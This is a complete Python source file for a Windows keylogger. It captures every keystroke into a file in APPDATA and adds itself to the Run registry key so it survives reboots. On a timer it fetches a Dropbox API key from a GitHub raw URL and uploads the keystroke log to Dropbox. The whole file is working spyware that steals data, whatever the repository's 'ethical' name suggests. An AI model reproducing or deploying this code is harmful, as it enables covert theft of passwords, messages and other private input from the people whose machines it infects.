from pynput import keyboard
import os
import winreg as reg
import getpass
import requests
import dropbox
import threading
import time
from dropbox.files import WriteMode

API_KEY_URL = "https://raw.githubusercontent.com/ragej4x/ethicals-keylog/refs/heads/main/key.txt"

log_path = os.path.join(os.getenv("APPDATA") or os.getcwd(), "logs.txt")


def on_press(key):
    try:
        with open(log_path, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_path, "a") as f:
            f.write(f"[{key}]")

def fetch_api_key():
    try:
        response = requests.get(API_KEY_URL)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(f"Failed to fetch API key: {response.status_code}")
    except Exception as e:
        print(f"Error fetching API key: {e}")
    return None

def upload_to_dropbox():
    api_key = fetch_api_key()
    if not api_key:
        print("No API key available. Skipping upload.")
        return
    try:
        dbx = dropbox.Dropbox(api_key)
        # Format Dropbox filename with current date and time
        dropbox_filename = time.strftime("/logs_%Y-%m-%d_%H-%M-%S.txt")
        with open(log_path, "rb") as f:
            dbx.files_upload(f.read(), dropbox_filename, mode=WriteMode.overwrite)
    except Exception as e:
        print(f"Dropbox upload failed: {e}")

def schedule_upload():
    upload_to_dropbox()
    threading.Timer(100, schedule_upload).start()

def add_to_startup():
    exe_path = os.path.realpath(__file__).replace(".py", ".exe")  # when converted
    key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                      0, reg.KEY_SET_VALUE)
    reg.SetValueEx(key, "apikeylogged", 0, reg.REG_SZ, exe_path)

if __name__ == "__main__":
    add_to_startup()

    schedule_upload()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

